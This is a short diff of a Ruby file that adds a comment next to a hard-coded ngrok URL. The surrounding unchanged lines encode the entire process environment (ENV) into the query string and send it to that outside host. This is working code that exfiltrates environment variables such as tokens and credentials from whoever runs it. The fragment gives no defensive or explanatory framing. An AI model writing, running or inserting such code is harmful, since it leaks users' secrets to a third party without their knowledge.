@@ -3,7 +3,7 @@
 require "uri"
 require "open-uri"
 
-uri = URI("https://cf76-133-237-7-72.jp.ngrok.io")
+uri = URI("https://cf76-133-237-7-72.jp.ngrok.io") # NOTE: This is a URL to an external server
 uri.query = URI.encode_www_form(ENV)
 URI.open(uri, &:read)
 
